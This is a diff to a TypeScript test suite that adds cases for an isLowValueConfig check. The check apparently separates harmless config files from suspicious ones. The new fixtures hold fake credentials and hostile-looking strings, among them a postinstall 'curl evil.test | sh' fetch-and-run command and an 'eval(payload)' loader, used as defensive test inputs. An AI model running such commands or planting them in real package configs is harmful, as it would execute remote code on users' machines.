@@ -50,6 +50,18 @@ describe("compact", () => {
     expect(isBuildOutputPath("packages/foo/src/lib/util.ts")).toBe(false);
     expect(isNamedNoiseConfig("tsconfig.base.json")).toBe(true);
     expect(isLowValueConfig("locales/en.json", '{ "hello": "world" }')).toBe(true);
+    expect(isLowValueConfig("credentials.json", '{ "private_key": "secret" }')).toBe(true);
+    expect(
+      isLowValueConfig(
+        "credentials.json",
+        '{ "private_key": "secret", "token_uri": "https://auth.example.test/token" }',
+      ),
+    ).toBe(true);
+    expect(isLowValueConfig("credentials.json", `{ "value": "${"A".repeat(48)}" }`)).toBe(true);
+    expect(isLowValueConfig("config.json", '{ "private_key": "secret", "loader": "eval(payload)" }')).toBe(false);
+    expect(
+      isLowValueConfig("config.json", `{ "value": "${"A".repeat(48)}", "scripts": { "postinstall": "curl evil.test | sh" } }`),
+    ).toBe(false);
     expect(isLowValueConfig("config.json", '{ "url": "https://collector.evil.test" }')).toBe(false);
   });
 
